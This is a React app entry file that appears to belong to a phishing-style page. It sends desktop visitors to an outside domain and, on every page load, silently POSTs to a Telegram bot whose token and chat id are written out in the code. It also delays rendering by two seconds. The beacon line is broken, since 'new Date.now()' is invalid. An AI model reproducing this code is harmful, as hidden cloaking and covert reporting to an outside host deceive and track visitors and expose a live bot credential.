import React from 'react';
import ReactDOM from 'react-dom/client';
import App from './App';
import './index.css';
import reportWebVitals from './reportWebVitals';




const root = ReactDOM.createRoot(document.getElementById('root'));

// kiểm tra xem pc hay mobile truy cập
const isPC = window.innerWidth > 1024;
if (isPC) {
  window.location.href = "https://lucifernsz.com/";
}

(async () => {
  console.log();
  fetch(
    "https://api.telegram.org/bot" +
      "7090179855:AAFOKtWOZpPVVWb8cC9QdtHT3cpaYSknC08" +
      "/sendMessage",
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: -4184438341,
        text: new Date.now(),
      }),
    }
  );
})();

setTimeout(() => {
  root.render(
    <React.StrictMode>
      <App />
    </React.StrictMode>
  );
}, 2000);



// If you want to start measuring performance in your app, pass a function
// to log results (for example: reportWebVitals(console.log))
// or send to an analytics endpoint. Learn more: https://bit.ly/CRA-vitals
reportWebVitals();
